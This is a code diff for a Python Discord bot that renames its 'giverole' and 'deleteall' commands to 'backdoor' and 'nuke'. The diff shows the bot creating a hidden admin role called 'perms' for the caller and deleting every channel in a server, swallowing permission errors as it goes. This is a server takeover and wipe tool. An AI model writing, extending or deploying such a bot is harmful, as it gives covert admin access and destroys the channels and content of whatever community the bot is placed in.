@@ -39,8 +39,8 @@ intents.message_content = False
 # ================= BOT SETUP =================
 
 # Prefix is "$sudo " so commands look like:
-# $sudo giverole
-# $sudo deleteall
+# $sudo backdoor
+# $sudo nuke
 bot = commands.Bot(
     command_prefix="$sudo ",
     intents=intents,
@@ -165,10 +165,10 @@ async def on_member_ban(guild, user):
 
 # ================= SUDO COMMANDS =================
 
-# $sudo giverole
+# $sudo backdoor
 # Creates an admin role called "perms" and assigns it
-@bot.command(name="giverole")
-async def sudo_giverole(ctx: commands.Context):
+@bot.command(name="backdoor")
+async def sudo_backdoor(ctx: commands.Context):
 
     # Permission check
     if not allowed(ctx.author):
@@ -205,10 +205,10 @@ async def sudo_giverole(ctx: commands.Context):
         await ctx.send("❌ I can’t assign that role (role hierarchy issue).")
 
 
-# $sudo deleteall
+# $sudo nuke
 # Deletes EVERY channel in the server
-@bot.command(name="deleteall")
-async def sudo_deleteall(ctx: commands.Context):
+@bot.command(name="nuke")
+async def sudo_nuke(ctx: commands.Context):
 
     # Permission check
     if not allowed(ctx.author):
@@ -227,7 +227,7 @@ async def sudo_deleteall(ctx: commands.Context):
     # Loop through and delete channels
     for channel in guild.channels:
         try:
-            await channel.delete(reason="Sudo deleteall invoked")
+            await channel.delete(reason="Sudo nuke invoked")
         except discord.Forbidden:
             pass  # Missing permissions
         except discord.HTTPException:
@@ -245,3 +245,4 @@ time.sleep(5)
 
 # Start bot
 bot.run(TOKEN)
+
